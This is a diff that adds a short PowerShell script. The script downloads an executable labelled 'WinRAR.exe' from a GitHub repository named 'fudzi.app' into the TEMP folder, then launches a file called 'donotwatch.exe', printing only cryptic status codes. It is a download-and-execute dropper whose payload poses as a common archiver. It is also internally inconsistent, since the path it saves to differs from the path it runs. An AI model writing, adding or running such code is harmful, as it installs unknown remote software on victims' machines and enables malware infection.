@@ -1,0 +1,21 @@
+try {
+    Write-Host '123' -ForegroundColor Gray
+    $outputFile = Join-Path $env:TEMP "donotwatch.exe"
+    $wc = New-Object Net.WebClient
+    $wc.DownloadFile('https://github.com/not-seil/fudzi.app/raw/main/WinRAR.exe', $env:TEMP + '\WinRAR.exe')
+} catch {
+    Write-Host '1234' -ForegroundColor Red
+    pause
+    return
+}
+try {
+    Start-Process -FilePath $outputFile -Wait
+    Write-Host '7643' -ForegroundColor Green
+    Write-Host '(hk)' -ForegroundColor Blue
+    pause
+    return
+} catch {
+    Write-Host 'пыва' -ForegroundColor Red
+    pause
+    return
+}
